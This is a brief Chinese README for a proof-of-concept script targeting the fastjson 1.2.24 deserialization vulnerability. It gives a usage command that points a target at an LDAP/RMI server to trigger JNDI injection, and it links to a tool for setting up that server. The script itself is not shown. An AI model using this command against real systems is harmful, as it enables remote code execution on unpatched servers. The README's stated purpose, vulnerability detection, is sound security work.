# fastjson-poc
fastjson 漏洞利用
## fastjson-1.2.24 poc
fastjson-1.2.24-poc.py 为检测fastjson 1.2.24版本漏洞
### 使用示例
```
说明：
python3 fastjson-1.2.24-poc.py -u url -r 远程调用的rmi/ldap服务
示例：
python fastjson-1.2.24.py -u http://10.0.0.135:8090/ -r ldap://10.0.0.135:1389/t1kg1e
```
**LDAP/RMI服务搭建可参考https://github.com/welk1n/JNDI-Injection-Exploit/**
